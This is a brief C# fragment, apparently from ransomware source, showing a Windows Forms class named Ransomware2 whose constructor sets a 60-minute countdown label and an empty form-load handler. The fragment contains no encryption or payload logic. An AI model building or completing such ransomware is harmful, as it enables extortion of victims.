...
namespace Ransomware2._0
{
    public partial class Ransomware2 : Form
    {
        ...
        {
            InitializeComponent();
            label3.Text = TimeSpan.FromMinutes(60).ToString(); //set countdowntimer to 60 minutes
        }
        ...
        private void Ransomware2_Load_1(object sender, EventArgs e)
        {
